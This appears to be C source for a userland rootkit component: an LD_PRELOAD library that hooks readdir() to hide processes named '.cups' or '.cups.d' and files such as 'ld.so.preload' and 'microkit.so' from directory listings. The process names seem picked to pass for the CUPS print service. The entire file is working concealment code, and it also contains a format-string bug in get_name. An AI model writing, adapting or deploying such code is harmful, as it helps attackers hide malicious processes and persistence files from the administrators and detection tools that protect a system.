#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>

#define DEBUG 1
#define DEBUG_LOG_ERR(args...)                                                 \
  if (DEBUG)                                                                   \
  fprintf(stderr, args)

static struct dirent *(*orig_readdir)(DIR *) = NULL;

char *DELIM = "\t";
char *HIDDEN_PROCS[] = {".cups", ".cups.d"};
size_t HIDDEN_PROCS_COUNT = 2;
char *HIDDEN_FILES[] = {".cups", ".cups.d", "ld.so.preload", "microkit.so"};
size_t HIDDEN_FILES_COUNT = 4;

bool get_name(char *name, char *pid);
bool is_hidden(char *hidden[], size_t n_hidden, char *name);
bool is_numeric(char *text);
bool check_inode(ino_t inode, char *filepath);

struct dirent *readdir(DIR *dirp) {
  if (orig_readdir == NULL) {
    orig_readdir = dlsym(RTLD_NEXT, "readdir\0");
    DEBUG_LOG_ERR("[LD_PRELOAD] Successfully preloaded! %p\n", orig_readdir);
  }

  struct dirent *tmp;
  tmp = orig_readdir(dirp);

  if (!tmp) {
    // readdir has error
    return tmp;
  }

  char *filename = tmp->d_name;
  char process_name[256];
  // DEBUG_LOG_ERR("[LD_PRELOAD] Filename: %s\tInode: %d\n", filename, tmp->d_ino);
  if (is_numeric(filename) && get_name(process_name, filename)) {
    // DEBUG_LOG_ERR("[LD_PRELOAD] Name: %s \n", process_name);
    if (is_hidden(HIDDEN_PROCS, HIDDEN_PROCS_COUNT, process_name) &&
        check_inode(tmp->d_ino, filename)) {
      DEBUG_LOG_ERR("[LD_PRELOAD] Skipping Process: %s\n", process_name);
      tmp = readdir(dirp);
    }
  } else if (is_hidden(HIDDEN_FILES, HIDDEN_FILES_COUNT, filename)) {
    DEBUG_LOG_ERR("[LD_PRELOAD] Skipping File: %s\n", process_name);
    tmp = readdir(dirp);
  }

  return tmp;
}

// lookup the name of the process with the given process_id
bool get_name(char *name, char *pid) {
  // DEBUG_LOG_ERR("Get Name of pid: %s \n", pid);
  FILE *fp;
  char *filepath_start = "/proc/";
  char *filepath_end = "/comm";
  size_t filepath_size =
      strlen(filepath_start) + strlen(pid) + strlen(filepath_end) + 1;
  char filepath[filepath_size];
  sprintf(filepath, "%s%s%s", filepath_start, pid, filepath_end);
  fp = fopen(filepath, "r");
  if (fp != NULL) {
    // DEBUG_LOG_ERR("Get Name of pid at filepath: %s \n", filepath);
    char name_tmp[512];
    if (fgets(name_tmp, sizeof(name_tmp), fp)) {
      name_tmp[strlen(name_tmp) - 1] = '\x00'; // remove trailing newline

      // char *token = strtok(status_line, DELIM);
      sprintf(name, name_tmp);

      // DEBUG_LOG_ERR("Name: %s \n", name);
      return true;
    }
  }
  return false;
}

// Check if the name is in the list of process-names to hide
bool is_hidden(char *hidden[], size_t n_hidden, char *name) {
  // DEBUG_LOG_ERR("Should hide File (%s)?\n", name);
  for (int i = 0; i < n_hidden && hidden[i] != NULL; i++) {
    // DEBUG_LOG_ERR("Test %s against %s: %d\n", name, HIDDEN[i], strcmp(name,
    // HIDDEN[i]));
    if (strcmp(name, hidden[i]) == 0) {
      // DEBUG_LOG_ERR("Yes, hide!\n");
      return true;
    }
  }
  return false;
}

// check if the given string is a number
bool is_numeric(char *text) {
  size_t n_chars = strlen(text);
  for (int i = 0; i < n_chars; i++) {
    if (text[i] < '0' || text[i] > '9') {
      return false;
    }
  }
  return true;
}

bool check_inode(ino_t inode, char *filepath) {
  // DEBUG_LOG_ERR("Comparing Inodes: %d <-> %s\n", inode, filepath);
  int fd;
  char *path;
  if (is_numeric(filepath)) {
    path = malloc(strlen(filepath) + 7); // '/proc/\x00'
    sprintf(path, "/proc/%s", filepath);
  } else {
    path = malloc(strlen(filepath) + 1);
    sprintf(path, "%s", filepath);
  }

  fd = open(path, O_RDONLY);
  free(path);

  if (fd < 0) {
    // ERROR
    // DEBUG_LOG_ERR("Inode filepath invalid...\n(%s)\n", path);
    return false;
  }

  struct stat file_stat;
  int ret;
  ret = fstat(fd, &file_stat);
  if (ret < 0) {
    // error getting file stat
    // DEBUG_LOG_ERR("Failed to read fstat...\n");
    return false;
  }

  // DEBUG_LOG_ERR("Inodes: %d <-> %d (%s)\n", inode, file_stat.st_ino, filepath);

  return inode == file_stat.st_ino;
}
